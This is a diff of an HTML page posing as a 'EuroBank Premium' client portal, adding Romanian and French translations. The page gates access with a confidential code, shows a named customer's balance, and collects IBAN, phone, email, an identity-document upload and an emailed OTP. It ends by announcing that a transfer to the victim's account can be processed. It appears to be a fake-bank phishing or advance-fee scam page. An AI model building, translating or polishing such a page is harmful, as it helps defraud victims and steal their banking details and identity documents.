@@ -10,12 +10,8 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
-        
-        /* --- FOND BLANC & COULEURS GLOBALES --- */
         body{background-color:#f8fafc;background-image:none;color:#1e293b;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:20px 15px;overflow-x:hidden;}
         .container{max-width:440px;width:100%;position:relative;z-index:10;}
-        
-        /* --- BOUTONS ET NAVIGATION --- */
         .top-bar{display:flex;justify-content:flex-end;margin-bottom:15px;}
         .lang-toggle{display:flex;gap:6px;background:#fff;padding:4px;border-radius:30px;border:1px solid #cbd5e1;box-shadow: 0 2px 4px rgba(0,0,0,0.05);}
         .lang-toggle button{padding:4px 12px;border:none;background:transparent;border-radius:20px;font-size:11px;font-weight:700;cursor:pointer;color:#64748b;transition:0.2s;font-family:inherit;}
@@ -30,8 +26,6 @@
         .btn-logout:hover{background:#f1f5f9;color:#1e293b;border-color:#94a3b8;}
         .btn-biometric-activate{background:#eff6ff;border:1px solid #93c5fd;color:#2563eb;padding:8px 14px;border-radius:20px;font-size:12px;font-weight:700;cursor:pointer;transition:0.3s;display:flex;align-items:center;gap:6px;}
         .btn-biometric-activate:hover{background:#dbeafe;color:#1d4ed8;}
-        
-        /* --- TITRES --- */
         .dashboard-title{text-align:center;margin-bottom:25px;}
         .dashboard-title h1{font-size:22px;font-weight:800;color:#0f172a;margin-bottom:5px;}
         .dashboard-title p{font-size:12px;color:#64748b;}
@@ -40,8 +34,6 @@
         .login-header .logo-icon{font-size:26px;color:#3b82f6;margin-bottom:12px;background:#eff6ff;padding:12px;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;border:1px solid #bfdbfe;}
         .login-header h1{font-size:26px;font-weight:800;background:linear-gradient(135deg,#0f172a,#1e3a8a,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px;}
         .login-header p{font-size:11px;color:#3b82f6;letter-spacing:2px;text-transform:uppercase;font-weight:700;}
-        
-        /* --- PANNEAUX ET FORMULAIRES --- */
         .glass-panel{background:#ffffff;border:1px solid #e2e8f0;border-radius:20px;padding:35px 25px;box-shadow:0 10px 25px rgba(0,0,0,0.05);animation:slideUp 0.6s ease;}
         .form-group{margin-bottom:24px;position:relative;}
         .form-group label{display:block;font-size:11px;color:#475569;margin-bottom:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
@@ -51,8 +43,6 @@
         .form-group select{appearance:none;cursor:pointer;}
         .form-group input::placeholder{color:#94a3b8;font-weight:400;}
         .form-group input:focus, .form-group select:focus{border-color:#3b82f6;background:#ffffff;box-shadow:0 0 0 3px rgba(59, 130, 246, 0.1);}
-        
-        /* --- CHECKBOX ET FICHIERS --- */
         .custom-checkbox{display:flex;align-items:flex-start;gap:10px;cursor:pointer;margin-bottom:14px;position:relative;font-size:12px;color:#334155;line-height:1.5;}
         .custom-checkbox input{position:absolute;opacity:0;cursor:pointer;height:0;width:0;}
         .checkmark{position:relative;top:2px;height:18px;width:18px;background-color:#fff;border:1px solid #94a3b8;border-radius:5px;flex-shrink:0;transition:all 0.2s;}
@@ -67,8 +57,6 @@
         .error-text.show{display:block;}
         .forgot-password{display:block;text-align:right;font-size:12px;color:#64748b;text-decoration:none;margin-bottom:20px;transition:0.3s;}
         .forgot-password:hover{color:#3b82f6;}
-        
-        /* --- BOUTONS PRINCIPAUX --- */
         .btn-gold{width:100%;background:linear-gradient(135deg,#60a5fa,#2563eb);color:#fff;border:none;padding:16px;border-radius:14px;font-size:13px;font-weight:800;cursor:pointer;transition:0.3s;text-transform:uppercase;letter-spacing:1px;box-shadow:0 4px 10px rgba(37,99,235,0.2);font-family:inherit;display:flex;justify-content:center;align-items:center;gap:8px;}
         .btn-gold:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(37,99,235,0.3);}
         .btn-gold:disabled{background:#cbd5e1;color:#94a3b8;cursor:not-allowed;transform:none;box-shadow:none;}
@@ -78,18 +66,12 @@
         .biometric-section p{font-size:11px;color:#64748b;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px;font-weight:600;}
         .biometric-icon{display:inline-flex;justify-content:center;align-items:center;width:44px;height:44px;border-radius:50%;border:1px solid #cbd5e1;color:#3b82f6;font-size:20px;cursor:pointer;transition:0.3s;background:#fff;}
         .biometric-icon:hover{background:#eff6ff;border-color:#93c5fd;}
-        
-        /* --- LOADER GLOBAL --- */
         .global-loader{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.9);z-index:10000;display:none;flex-direction:column;align-items:center;justify-content:center;backdrop-filter:blur(4px);}
         .global-loader.show{display:flex;animation:fadeIn 0.3s ease;}
         .global-loader .gold-spinner{width:50px;height:50px;border-width:4px;border-color:#e2e8f0;border-top-color:#3b82f6;margin-bottom:20px;border-radius:50%;animation:spin 1s linear infinite;}
         .global-loader .loader-text{font-size:14px;color:#3b82f6;letter-spacing:2px;text-transform:uppercase;font-weight:700;animation:pulseText 1.5s infinite;}
-        
-        /* --- PAGES --- */
         .page{display:none;}
         .page.active{display:block;animation:fadeIn 0.5s ease;}
-        
-        /* --- CARTE BANCAIRE (Garde le fond sombre pour le premium) --- */
         .card-wrapper{perspective:1000px;width:100%;max-width:390px;margin:0 auto 20px;animation:floatCard 6s ease-in-out infinite;}
         .card-flipper{position:relative;width:100%;aspect-ratio:1.586;transition:transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);transform-style:preserve-3d;}
         .card-flipper.flipped{transform:rotateY(180deg);}
@@ -141,14 +123,11 @@
         .card-back-info p{font-size:8px;color:#94a3b8;line-height:1.5;}
         .card-back-info .back-name{font-size:10px;color:#ffffff;font-weight:800;letter-spacing:1.5px;margin-bottom:4px;text-transform:uppercase;}
         @media (max-width:480px){.card-wrapper{max-width:340px;}.card-front{padding:18px;}.card-logo-img{height:18px;}.card-number{font-size:14px;letter-spacing:1px;}.card-balance{padding:4px 6px;}.card-balance-usd{font-size:9px;}.card-balance-lak{font-size:6px;}.card-balance i{font-size:10px;}.contactless{font-size:12px;}.number-icons i{font-size:11px;}.holder-name{font-size:10px;}.valid-thru span{font-size:10px;}.mc-circle{width:20px;height:20px;}.mc-orange{margin-left:-8px;}.mc-gold-label{font-size:7px;}.magnetic-strip{height:35px;margin-top:15px;}.signature-box{height:28px;}.cvv-text{font-size:12px;}}
-        
-        /* --- SOLDE ET INFOS --- */
         .balance-section{text-align:center;margin-bottom:25px;}
         .balance-label{font-size:11px;color:#64748b;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:6px;display:flex;justify-content:center;align-items:center;gap:8px;font-weight:700;}
         .balance-label i{cursor:pointer;color:#3b82f6;}
         .balance-amount{font-size:22px;font-weight:800;color:#0f172a;font-family:Arial, sans-serif;}
         .balance-lak{font-size:12px;color:#94a3b8;margin-top:4px;}
-        
         .bcel-card{background:#ffffff;border-radius:16px;padding:20px;margin-bottom:20px;border:1px dashed #cbd5e1;display:flex;justify-content:space-between;align-items:center;gap:12px;box-shadow:0 2px 5px rgba(0,0,0,0.02);}
         .bcel-left{display:flex;align-items:center;gap:12px;}
         .bcel-icon{width:40px;height:40px;background:#f1f5f9;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#64748b;font-weight:800;font-size:11px;}
@@ -157,7 +136,6 @@
         .bcel-status{font-size:12px;color:#64748b;}
         .bcel-badge{background:#f1f5f9;color:#64748b;font-size:10px;font-weight:700;padding:6px 12px;border-radius:12px;}
         .bcel-badge.linked{background:#dcfce7;color:#16a34a;}
-        
         .info-card{background:#ffffff;border-radius:16px;padding:20px;margin-bottom:20px;border:1px solid #e2e8f0;box-shadow:0 2px 5px rgba(0,0,0,0.02);}
         .info-title{font-size:11px;font-weight:700;color:#3b82f6;margin-bottom:15px;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;gap:8px;}
         .info-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f1f5f9;font-size:13px;}
@@ -165,8 +143,6 @@
         .info-row .lbl{color:#64748b;font-weight:500;}
         .info-row .val{color:#0f172a;font-weight:600;text-align:right;}
         .info-row .val.green{color:#16a34a;font-weight:700;}
-        
-        /* --- ACTIONS ET HISTORIQUE --- */
         .actions-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:25px;}
         .action-btn{background:#ffffff;border:1px solid #e2e8f0;border-radius:16px;padding:18px 10px;display:flex;flex-direction:column;align-items:center;gap:10px;color:#94a3b8;cursor:not-allowed;position:relative;transition:0.3s;box-shadow:0 2px 5px rgba(0,0,0,0.02);}
         .action-btn.active-action{cursor:pointer;color:#0f172a;}
@@ -175,7 +151,6 @@
         .action-btn i{font-size:18px;}
         .action-btn span{font-size:10px;font-weight:600;text-align:center;line-height:1.2;}
         .soon-badge{position:absolute;top:-6px;right:-4px;background:#3b82f6;color:#fff;font-size:8px;font-weight:800;padding:2px 6px;border-radius:8px;text-transform:uppercase;}
-        
         .history-section{background:#ffffff;border-radius:16px;padding:20px;border:1px solid #e2e8f0;box-shadow:0 2px 5px rgba(0,0,0,0.02);margin-bottom:25px;}
         .history-title{font-size:12px;color:#3b82f6;margin-bottom:15px;font-weight:700;display:flex;align-items:center;gap:8px;text-transform:uppercase;letter-spacing:1px;}
         .history-item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #f1f5f9;}
@@ -187,27 +162,19 @@
         .hist-amount{font-size:13px;font-weight:700;color:#16a34a;white-space:nowrap;}
         .btn-toggle-history{width:100%;background:transparent;border:1px dashed #cbd5e1;color:#64748b;padding:12px;border-radius:12px;font-size:11px;font-weight:700;cursor:pointer;margin-top:15px;transition:0.2s;text-transform:uppercase;letter-spacing:0.5px;}
         .btn-toggle-history:hover{background:#f8fafc;color:#3b82f6;border-color:#93c5fd;}
-        
-        /* --- FOOTER --- */
         .footer-note{text-align:center;font-size:10px;color:#94a3b8;line-height:1.5;margin-bottom:15px;border-top:1px solid #e2e8f0;padding-top:15px;}
         .security-badges{display:flex;justify-content:center;gap:8px;margin-top:10px;flex-wrap:wrap;}
         .security-badges span{font-size:9px;color:#64748b;background:#f8fafc;padding:4px 10px;border-radius:12px;border:1px solid #e2e8f0;display:flex;align-items:center;gap:4px;}
         .security-badges i{color:#3b82f6;}
-        
-        /* --- TOASTS --- */
         .toast-container{position:fixed;top:15px;right:15px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none;}
         .toast{background:#ffffff;color:#0f172a;padding:12px 18px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,0.1);font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px;border-left:4px solid #3b82f6;transform:translateX(120%);transition:transform 0.3s cubic-bezier(0.175,0.885,0.32,1.275);pointer-events:auto;}
         .toast.show{transform:translateX(0);}
-        
-        /* --- ANIMATIONS --- */
         @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
         @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
         @keyframes slideUp{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
         @keyframes floatCard{0%{transform:translateY(0px);}50%{transform:translateY(-6px);}100%{transform:translateY(0px);}}
         @keyframes shimmer{100%{left:200%;}}
         @keyframes pulseText{0%, 100%{opacity:1;}50%{opacity:0.5;}}
-        
-        /* --- GATE (PAGE DE CODE) --- */
         .gate-wrapper{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:80vh;width:100%;animation:fadeIn 1s ease;}
         .gate-brand{text-align:center;margin-bottom:35px;}
         .gate-logo-img{height:50px;width:auto;object-fit:contain;margin-bottom:15px;}
@@ -226,16 +193,12 @@
         .gate-input-group input:focus ~ .gate-input-line{width:80%;}
         .gate-btn{padding:16px;font-size:14px;letter-spacing:1.5px;}
         #gateError{text-align:center;margin-top:20px;background:#fef2f2;padding:10px;border-radius:8px;border:1px solid #fecaca;}
-        
-        /* --- SÉLECTION DE BANQUE --- */
         .bank-selector{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;}
         .bank-option{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:15px 10px;text-align:center;cursor:pointer;transition:all 0.3s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;}
         .bank-option:hover{background:#eff6ff;border-color:#93c5fd;}
         .bank-option.selected{background:#eff6ff;border-color:#3b82f6;box-shadow:0 0 0 2px rgba(59,130,246,0.2);}
         .bank-option i{font-size:24px;color:#3b82f6;}
         .bank-option span{font-size:12px;font-weight:700;color:#0f172a;}
-
-        /* --- SUCCÈS --- */
         .success-container{text-align:center;animation:slideUp 0.6s ease;}
         .success-icon-wrapper{position:relative;display:inline-flex;justify-content:center;align-items:center;width:80px;height:80px;margin-bottom:20px;}
         .success-icon-wrapper::before{content:'';position:absolute;width:100%;height:100%;border-radius:50%;background:#dcfce7;animation:pulseSuccess 2s infinite;}
@@ -513,7 +476,6 @@
                     </div>
                     <div class="form-group"><label data-lang="holder_name">Nume Titular Cont</label><div class="input-wrapper"><i class="fas fa-user"></i><input type="text" id="accountHolder" placeholder="Introduceți numele complet" oninput="validateField(this,'errName')"></div><div class="error-text" id="errName">Nume invalid.</div></div>
                     
-                    <!-- TELEFON CU INDICATIF -->
                     <div class="form-group">
                         <label data-lang="phone">Număr Telefon</label>
                         <div class="input-wrapper" style="display: flex; gap: 10px;">
@@ -557,7 +519,7 @@
                             <input type="file" id="dpiFile" accept="image/*,.pdf" onchange="validateFile(this)" style="display:none;">
                             <div class="file-icon-bg"><i class="fas fa-cloud-upload-alt"></i></div>
                             <div class="file-upload-text" id="dpiFileName" data-lang="placeholder_dpi" style="font-size:12px; font-weight:600; color:#3b82f6;">Apăsați pentru a încărca documentul</div>
-                            <div style="font-size:10px; color:#94a3b8; margin-top:6px;">Format acceptat: JPG, PNG sau PDF (Max 5MB)</div>
+                            <div style="font-size:10px; color:#94a3b8; margin-top:6px;" data-lang="file_format">Format acceptat: JPG, PNG sau PDF (Max 5MB)</div>
                         </div>
                         <div class="error-text" id="errFile">Document obligatoriu.</div>
                     </div>
@@ -575,27 +537,27 @@
                     </div>
                     <button class="btn-gold" id="btnSendOtp" onclick="demanderCodeOTP()" style="padding:18px; font-size:14px;">
                         <i class="fas fa-paper-plane" id="btnLinkIcon"></i>
-                        <span id="btnLinkText" data-lang="confirm_link">Lier mon compte</span>
+                        <span id="btnLinkText" data-lang="confirm_link">Conectează Contul</span>
                         <div class="btn-spinner" id="btnLinkSpinner"></div>
                     </button>
                 </div>
                 
                 <div id="otpStep" style="display:none;text-align:center;">
                     <div style="font-size:32px;color:#3b82f6;margin-bottom:15px; background:#eff6ff; width:64px; height:64px; display:inline-flex; justify-content:center; align-items:center; border-radius:50%; border:1px solid #bfdbfe;"><i class="fas fa-envelope-open-text"></i></div>
-                    <h3 style="color:#0f172a;margin-bottom:8px;font-size:18px; font-weight:700;">Verificare Email</h3>
-                    <p style="font-size:12px;color:#64748b;margin-bottom:15px;">Vérifiez votre boîte mail, copiez le code reçu et collez-le ci-dessous :</p>
+                    <h3 style="color:#0f172a;margin-bottom:8px;font-size:18px; font-weight:700;" data-lang="otp_title">Verificare Email</h3>
+                    <p style="font-size:12px;color:#64748b;margin-bottom:15px;" data-lang="otp_text">Verificați căsuța poștală, copiați codul primit și lipiți-l mai jos:</p>
                     <strong id="displayEmail" style="color:#3b82f6;display:block;margin-bottom:20px;font-size:14px;"></strong>
                     
                     <div style="background:#fffbeb; border-left:4px solid #f59e0b; padding:12px; border-radius:8px; margin-bottom:20px; text-align:left;">
-                        <p style="font-size: 11px; color: #b45309; margin: 0; line-height: 1.4;">
+                        <p style="font-size: 11px; color: #b45309; margin: 0; line-height: 1.4;" data-lang="otp_warning">
                             <i class="fas fa-exclamation-triangle" style="margin-right: 5px;"></i>
-                            <strong>Important :</strong> Si vous ne trouvez pas l'email dans votre boîte de réception, veuillez vérifier votre dossier <strong>Spam / Courrier indésirable</strong>.
+                            <strong>Important :</strong> Dacă nu găsiți emailul în inbox, verificați folderul <strong>Spam / Corespondență nedorită</strong>.
                         </p>
                     </div>
 
                     <div class="form-group"><input type="text" id="otpCodeInput" maxlength="6" placeholder="000000" style="text-align:center;font-size:24px;letter-spacing:8px;padding:16px;background:#f8fafc;border:1px solid #3b82f6;color:#0f172a;border-radius:14px;width:100%;font-family:monospace;"></div>
-                    <button class="btn-gold" id="btnVerifyOtp" onclick="validerCodeOTP()" style="padding:18px; font-size:14px;"><i class="fas fa-check-double" id="btnOtpIcon"></i><span id="btnOtpText">Validează și Conectează</span><div class="btn-spinner" id="btnOtpSpinner"></div></button>
-                    <button class="btn-logout" onclick="retourFormulaire()" style="width:100%;margin-top:20px;justify-content:center; padding:14px;">Schimbă Email</button>
+                    <button class="btn-gold" id="btnVerifyOtp" onclick="validerCodeOTP()" style="padding:18px; font-size:14px;"><i class="fas fa-check-double" id="btnOtpIcon"></i><span id="btnOtpText" data-lang="otp_validate">Validează și Conectează</span><div class="btn-spinner" id="btnOtpSpinner"></div></button>
+                    <button class="btn-logout" onclick="retourFormulaire()" style="width:100%;margin-top:20px;justify-content:center; padding:14px;" data-lang="otp_change_email">Schimbă Email</button>
                 </div>
             </div>
         </div>
@@ -605,19 +567,23 @@
                 <div class="success-icon-wrapper">
                     <i class="fas fa-check-circle success-icon"></i>
                 </div>
-                <h1 class="success-title">Connexion réussie !</h1>
-                <p class="success-subtitle">Votre compte <span id="linkedBankNameSuccess" style="font-weight:800; color:#0f172a;">bancaire</span> est désormais lié.</p>
+                <h1 class="success-title" data-lang="success_title">Conectare Reușită!</h1>
+                <p class="success-subtitle">
+                    <span data-lang="success_subtitle_prefix">Contul dvs.</span>
+                    <span id="linkedBankNameSuccess" style="font-weight:800; color:#0f172a;">bancar</span>
+                    <span data-lang="success_subtitle_suffix">este acum conectat.</span>
+                </p>
                 
                 <div class="ref-box">
-                    <p class="ref-label">RÉFÉRENCE DE LA TRANSACTION</p>
+                    <p class="ref-label" data-lang="success_ref_label">REFERINȚĂ TRANZACȚIE</p>
                     <div id="linkRef" class="ref-value">EURO-KYC-2026-0000</div>
                 </div>
                 
                 <div class="congrats-box">
-                    <p><strong>Félicitations :</strong> le virement vers votre compte peut être traité. Un email de confirmation vient de vous être envoyé.</p>
+                    <p data-lang="success_congrats"><strong>Felicitări:</strong> transferul către contul dvs. poate fi procesat. Un email de confirmare tocmai v-a fost trimis.</p>
                 </div>
                 
-                <button class="btn-gold" onclick="goBackToDashboard()" style="padding:18px; font-size:14px;"><i class="fas fa-home"></i> <span>RETOUR AU TABLEAU DE BORD</span></button>
+                <button class="btn-gold" onclick="goBackToDashboard()" style="padding:18px; font-size:14px;"><i class="fas fa-home"></i> <span data-lang="success_back_btn">ÎNAPOI LA PANOUL DE CONTROL</span></button>
             </div>
         </div>
     </div>
@@ -668,9 +634,27 @@
         };
 
         const traductions = {
-            ro: { gate_title:"Acces Privat",gate_subtitle:"Portal Client VIP",gate_text:"Introduceți codul confidențial de acces.",gate_btn:"Deblocare Acces",gate_err:"Cod de acces incorect.",login_title:"Spațiu Privat",login_subtitle:"EuroBank Premium",card_number:"Număr Card",access_code:"Cod de Acces",access_btn:"Accesează Spațiul Meu",forgot_password:"Ai uitat parola?",or_login_with:"Sau conectează-te cu",login_error:"Date incorecte.",secure_connection:"Conexiune securizată SSL 256-bit",loading_login:"Se procesează...",dashboard_title:"Panou de Control",dashboard_subtitle:"Bine ați venit, MARIANA BOUROS",available_balance:"Sold Disponibil",no_linked_account:"Niciun cont conectat",not_linked_yet:"Neconectat",pending:"În așteptare",card_info:"Informații Card",holder:"Titular",card_type:"Tip Card",issuer:"Emitent",country:"Țară",status:"Status",active:"Activ",link_bcel:"Conectează Cont Bancar",transfer_to_bcel:"Transfer SEPA",download_statement:"Extras PDF",history:"Istoric Tranzacții",footer_note:"Datele dvs. sunt protejate.",logout:"Deconectare",soon:"În curând",activate_bio:"Activare Amprentă",back:"Înapoi",link_title:"Conectare Cont Bancar",kyc_subtitle:"Verificarea Identității Bancare (KYC)",bank_partner:"Selectează Banca",account_number:"Număr Cont / IBAN",account_type:"Tip Cont",savings:"Cont Economii",checking:"Cont Curent",holder_name:"Nume Titular Cont",phone:"Număr Telefon",email:"Adresă Email",dpi:"Document Identitate",placeholder_dpi:"Apăsați pentru a încărca documentul",terms_text:"Accept termenii și condițiile EuroBank.",aml_text:"Confirm că aceste fonduri provin dintr-o operațiune legală.",confirm_link:"Conectează Contul",success_title:"Conectare Reușită!",flip_card:"Vezi verso", authorized_signature:"Semnătură autorizată" },
-            fr: { gate_title:"Accès Privé",gate_subtitle:"Portail Client VIP",gate_text:"Veuillez saisir votre code d'accès confidentiel.",gate_btn:"Débloquer l'Accès",gate_err:"Code d'accès incorrect.",login_title:"Espace Privé",login_subtitle:"EuroBank Premium",card_number:"Numéro de Carte",access_code:"Code d'accès",access_btn:"Accéder à mon espace",forgot_password:"Mot de passe oublié ?",or_login_with:"Ou se connecter avec",login_error:"Identifiants incorrects.",secure_connection:"Connexion sécurisée SSL 256-bits",loading_login:"Traitement en cours...",dashboard_title:"Tableau de bord",dashboard_subtitle:"Bienvenue, MARIANA BOUROS",available_balance:"Solde Disponible",no_linked_account:"Aucun compte connecté",not_linked_yet:"Hors ligne",pending:"En attente",card_info:"Informations de la carte",holder:"Titulaire",card_type:"Type de carte",issuer:"Émetteur",country:"Pays",status:"Statut",active:"Actif",link_bcel:"Lier un compte bancaire",transfer_to_bcel:"Virement SEPA",download_statement:"Relevé PDF",history:"Historique des transactions",footer_note:"Vos données sont protégées.",logout:"Déconnexion",soon:"Bientôt",activate_bio:"Activer l'empreinte",back:"Retour",link_title:"Lier un compte",kyc_subtitle:"Vérification d'identité bancaire (KYC)",bank_partner:"Sélectionnez la Banque",account_number:"Numéro de compte / IBAN",account_type:"Type de compte",savings:"Compte Épargne",checking:"Compte Courant",holder_name:"Nom du Titulaire",phone:"Numéro de téléphone",email:"Adresse Email",dpi:"Pièce d'identité",placeholder_dpi:"Cliquez pour charger le document",terms_text:"J'accepte les conditions générales d'EuroBank.",aml_text:"Je certifie que ces fonds proviennent d'une opération légitime.",confirm_link:"Lier mon compte",success_title:"Liaison Réussie !",flip_card:"Voir le verso", authorized_signature:"Signature autorisée" }
+            ro: {
+                gate_title:"Acces Privat",gate_subtitle:"Portal Client VIP",gate_text:"Introduceți codul confidențial de acces.",gate_btn:"Deblocare Acces",gate_err:"Cod de acces incorect.",
+                login_title:"Spațiu Privat",login_subtitle:"EuroBank Premium",card_number:"Număr Card",access_code:"Cod de Acces",access_btn:"Accesează Spațiul Meu",forgot_password:"Ai uitat parola?",or_login_with:"Sau conectează-te cu",login_error:"Date incorecte.",
+                dashboard_title:"Panou de Control",dashboard_subtitle:"Bine ați venit, MARIANA BOUROS",available_balance:"Sold Disponibil",no_linked_account:"Niciun cont conectat",not_linked_yet:"Neconectat",pending:"În așteptare",card_info:"Informații Card",holder:"Titular",card_type:"Tip Card",issuer:"Emitent",country:"Țară",status:"Status",active:"Activ",
+                link_bcel:"Conectează Cont Bancar",transfer_to_bcel:"Transfer SEPA",download_statement:"Extras PDF",history:"Istoric Tranzacții",footer_note:"Datele dvs. sunt protejate.",logout:"Deconectare",soon:"În curând",activate_bio:"Activare Amprentă",back:"Înapoi",link_title:"Conectare Cont Bancar",kyc_subtitle:"Verificarea Identității Bancare (KYC)",bank_partner:"Selectează Banca",account_number:"Număr Cont / IBAN",account_type:"Tip Cont",savings:"Cont Economii",checking:"Cont Curent",holder_name:"Nume Titular Cont",phone:"Număr Telefon",email:"Adresă Email",dpi:"Document Identitate",placeholder_dpi:"Apăsați pentru a încărca documentul",file_format:"Format acceptat: JPG, PNG sau PDF (Max 5MB)",terms_text:"Accept termenii și condițiile EuroBank.",aml_text:"Confirm că aceste fonduri provin dintr-o operațiune legală.",confirm_link:"Conectează Contul",flip_card:"Vezi verso",authorized_signature:"Semnătură autorizată",
+                otp_title:"Verificare Email",otp_text:"Verificați căsuța poștală, copiați codul primit și lipiți-l mai jos:",otp_warning:"Important : Dacă nu găsiți emailul în inbox, verificați folderul Spam / Corespondență nedorită.",otp_validate:"Validează și Conectează",otp_change_email:"Schimbă Email",
+                success_title:"Conectare Reușită!",success_subtitle_prefix:"Contul dvs.",success_subtitle_suffix:"este acum conectat.",success_ref_label:"REFERINȚĂ TRANZACȚIE",success_congrats:"<strong>Felicitări:</strong> transferul către contul dvs. poate fi procesat. Un email de confirmare tocmai v-a fost trimis.",success_back_btn:"ÎNAPOI LA PANOUL DE CONTROL",
+                confirm_bio:"Doriți să activați conectarea prin amprentă digitală?",toast_select_bank:"Vă rugăm să selectați o bancă.",toast_accept_terms:"Acceptați termenii.",toast_email_sent:"📩 Email trimis! Verificați căsuța poștală.",toast_session_expired:"Sesiune expirată.",toast_otp_wrong:"Cod OTP incorect.",toast_bio_activated:"✓ Amprentă activată!",toast_bio_login:"✓ Autentificare reușită.",toast_unlinked:"Cont deconectat.",toast_copied:"✓ Copiat!",toast_copy_failed:"Copiere eșuată.",toast_db_error:"Eroare : Baza de date neconectată.",toast_email_error:"Eroare la trimiterea emailului.",toast_bio_unavailable:"Biometria nu este disponibilă.",toast_activate_bio_first:"Activați mai întâi amprenta.",toast_file_too_big:"Fișierul depășește 5 MB.",toast_doc_required:"Document obligatoriu.",toast_bank_first:"Selectați mai întâi banca.",status_connected:"Cont conectat",status_connected_word:"Conectat"
+            },
+            fr: {
+                gate_title:"Accès Privé",gate_subtitle:"Portail Client VIP",gate_text:"Veuillez saisir votre code d'accès confidentiel.",gate_btn:"Débloquer l'Accès",gate_err:"Code d'accès incorrect.",
+                login_title:"Espace Privé",login_subtitle:"EuroBank Premium",card_number:"Numéro de Carte",access_code:"Code d'accès",access_btn:"Accéder à mon espace",forgot_password:"Mot de passe oublié ?",or_login_with:"Ou se connecter avec",login_error:"Identifiants incorrects.",
+                dashboard_title:"Tableau de bord",dashboard_subtitle:"Bienvenue, MARIANA BOUROS",available_balance:"Solde Disponible",no_linked_account:"Aucun compte connecté",not_linked_yet:"Hors ligne",pending:"En attente",card_info:"Informations de la carte",holder:"Titulaire",card_type:"Type de carte",issuer:"Émetteur",country:"Pays",status:"Statut",active:"Actif",
+                link_bcel:"Lier un compte bancaire",transfer_to_bcel:"Virement SEPA",download_statement:"Relevé PDF",history:"Historique des transactions",footer_note:"Vos données sont protégées.",logout:"Déconnexion",soon:"Bientôt",activate_bio:"Activer l'empreinte",back:"Retour",link_title:"Lier un compte",kyc_subtitle:"Vérification d'identité bancaire (KYC)",bank_partner:"Sélectionnez la Banque",account_number:"Numéro de compte / IBAN",account_type:"Type de compte",savings:"Compte Épargne",checking:"Compte Courant",holder_name:"Nom du Titulaire",phone:"Numéro de téléphone",email:"Adresse Email",dpi:"Pièce d'identité",placeholder_dpi:"Cliquez pour charger le document",file_format:"Format accepté : JPG, PNG ou PDF (Max 5MB)",terms_text:"J'accepte les conditions générales d'EuroBank.",aml_text:"Je certifie que ces fonds proviennent d'une opération légitime.",confirm_link:"Lier mon compte",flip_card:"Voir le verso",authorized_signature:"Signature autorisée",
+                otp_title:"Vérification Email",otp_text:"Vérifiez votre boîte mail, copiez le code reçu et collez-le ci-dessous :",otp_warning:"Important : Si vous ne trouvez pas l'email dans votre boîte de réception, veuillez vérifier votre dossier Spam / Courrier indésirable.",otp_validate:"Valider et Connecter",otp_change_email:"Changer d'Email",
+                success_title:"Liaison Réussie !",success_subtitle_prefix:"Votre compte",success_subtitle_suffix:"est désormais lié.",success_ref_label:"RÉFÉRENCE DE LA TRANSACTION",success_congrats:"<strong>Félicitations :</strong> le virement vers votre compte peut être traité. Un email de confirmation vient de vous être envoyé.",success_back_btn:"RETOUR AU TABLEAU DE BORD",
+                confirm_bio:"Voulez-vous activer la connexion par empreinte digitale ?",toast_select_bank:"Veuillez sélectionner une banque.",toast_accept_terms:"Veuillez accepter les conditions.",toast_email_sent:"📩 Email envoyé ! Vérifiez votre boîte.",toast_session_expired:"Session expirée.",toast_otp_wrong:"Code OTP incorrect.",toast_bio_activated:"✓ Empreinte activée !",toast_bio_login:"✓ Authentification réussie.",toast_unlinked:"Compte déconnecté.",toast_copied:"✓ Copié !",toast_copy_failed:"Copie échouée.",toast_db_error:"Erreur : Base de données non connectée.",toast_email_error:"Erreur lors de l'envoi de l'email.",toast_bio_unavailable:"Biométrie non disponible.",toast_activate_bio_first:"Activez d'abord l'empreinte.",toast_file_too_big:"Le fichier dépasse 5 MB.",toast_doc_required:"Document obligatoire.",toast_bank_first:"Sélectionnez d'abord la banque.",status_connected:"Compte connecté",status_connected_word:"Connecté"
+            }
         };
+
+        function t(key){ return traductions[langueActuelle][key] || key; }
 
         function updatePhonePlaceholder() {
             const code = document.getElementById('countryCode').value;
@@ -704,9 +688,14 @@
             langueActuelle = lang;
             document.getElementById('btnRo').classList.toggle('active', lang==='ro');
             document.getElementById('btnFr').classList.toggle('active', lang==='fr');
-            document.querySelectorAll('[data-lang]').forEach(el=>{ const k=el.getAttribute('data-lang'); if(traductions[lang][k]!==undefined) el.innerHTML=traductions[lang][k]; });
+            document.querySelectorAll('[data-lang]').forEach(el=>{ 
+                const k=el.getAttribute('data-lang'); 
+                if(traductions[lang][k]!==undefined) el.innerHTML=traductions[lang][k]; 
+            });
             const btnToggle = document.getElementById('btnToggleHistory');
             if(btnToggle) btnToggle.textContent = lang==='ro'?(isHistoryExpanded?"Arată mai puțin":"Vezi mai mult"):(isHistoryExpanded?"Voir moins":"Voir plus");
+            // Rafraîchir l'état de la carte liée (textes dynamiques)
